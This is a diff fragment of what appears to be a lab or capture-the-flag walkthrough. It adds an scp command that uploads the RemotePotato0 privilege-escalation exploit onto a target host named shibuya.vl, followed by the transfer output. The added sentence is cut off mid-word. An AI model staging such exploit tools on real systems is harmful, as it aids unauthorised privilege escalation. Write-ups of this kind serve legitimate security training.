@@ -376,7 +376,12 @@ Found `nigels` session ID `1`
 Next step is to upload RemotePotato0
 
 ```python
-
+scp -i /home/kali/.ssh/id_ed25519 RemotePotato0.exe simon.watson@shibuya.vl:/programdata/
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+RemotePotato0.exe                                                                 100%  173KB   1.3MB/s   00:00
 ```
+This uploaded the remotepot
 
 
